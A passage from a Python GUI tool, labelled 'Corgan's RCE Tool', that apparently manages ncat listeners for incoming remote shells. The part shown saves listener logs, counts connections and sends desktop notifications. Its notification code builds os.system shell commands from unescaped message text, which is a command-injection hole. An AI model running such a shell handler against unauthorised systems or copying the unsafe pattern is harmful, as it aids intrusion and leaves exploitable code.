            ("JSON Format", "json")
        ]

        dialog = ctk.CTkToplevel(self)
        dialog.title("Save Logs")
        dialog.geometry("300x250")
        dialog.transient(self)
        dialog.grab_set()

        choice_var = ctk.StringVar(value="consolidated")

        for text, mode in save_options:
            ctk.CTkRadioButton(dialog, text=text, variable=choice_var, value=mode).pack(anchor="w", padx=20, pady=5)

        def save_logs_with_choice():
            choice = choice_var.get()
            dialog.destroy()
            if choice == "consolidated":
                self.save_consolidated_log(log_data)
            elif choice == "separate":
                self.save_separate_logs(log_data)
            else:
                self.save_json_log(log_data)

        save_btn = ctk.CTkButton(dialog, text="Save", command=save_logs_with_choice)
        save_btn.pack(pady=10)

    def save_consolidated_log(self, log_data):
        filename = filedialog.asksaveasfilename(
            title="Save Consolidated Log",
            defaultextension=".txt",
            filetypes=[("Text files", "*.txt"), ("All files", "*.*")],
            parent=self
        )
        if not filename:
            return
        try:
            with open(filename, "w") as f:
                for listener_name, content in log_data.items():
                    f.write(f"--- {listener_name} ---\n")
                    f.write(content)
                    f.write("\n\n")
            messagebox.showinfo("Success", f"Consolidated log saved to {filename}", parent=self)
        except Exception as e:
            messagebox.showerror("Error", f"Could not save log file: {e}", parent=self)

    def save_separate_logs(self, log_data):
        directory = filedialog.askdirectory(
            title="Select Directory to Save Logs",
            parent=self
        )
        if not directory:
            return
        try:
            for listener_name, content in log_data.items():
                filename = os.path.join(directory, f"{listener_name}_log.txt")
                with open(filename, "w") as f:
                    f.write(content)
            messagebox.showinfo("Success", f"Separate logs saved to {directory}", parent=self)
        except Exception as e:
            messagebox.showerror("Error", f"Could not save log files: {e}", parent=self)

    def save_json_log(self, log_data):
        filename = filedialog.asksaveasfilename(
            title="Save Logs as JSON",
            defaultextension=".json",
            filetypes=[("JSON files", "*.json"), ("All files", "*.*")],
            parent=self
        )
        if not filename:
            return
        try:
            with open(filename, 'w') as f:
                json.dump(log_data, f, indent=4)
            messagebox.showinfo("Success", f"Logs saved as JSON to {filename}", parent=self)
        except Exception as e:
            messagebox.showerror("Error", f"Could not save log file: {e}", parent=self)

    def update_connection_counter(self):
        self.connection_label.configure(text=f"Active: {len(self.active_connections)}")

    def show_notification(self, message):
        if self.settings["notifications"]:
            try:
                if platform.system() == "Darwin":
                    os.system(f"""osascript -e 'display notification "{message}" with title "Corgan\'s RCE Tool"'""")
                elif platform.system() == "Windows":
                    from win10toast import ToastNotifier
                    toaster = ToastNotifier()
                    toaster.show_toast("Corgan's RCE Tool", message)
                elif platform.system() == "Linux":
                    os.system(f'notify-send "Corgan\'s RCE Tool" "{message}"')
            except Exception as e:
                print(f"Error showing notification: {e}")

if __name__ == "__main__":
    server_thread = threading.Thread(target=start_server, daemon=True)
    server_thread.start()
    app = NcatGUI()
    app.mainloop()  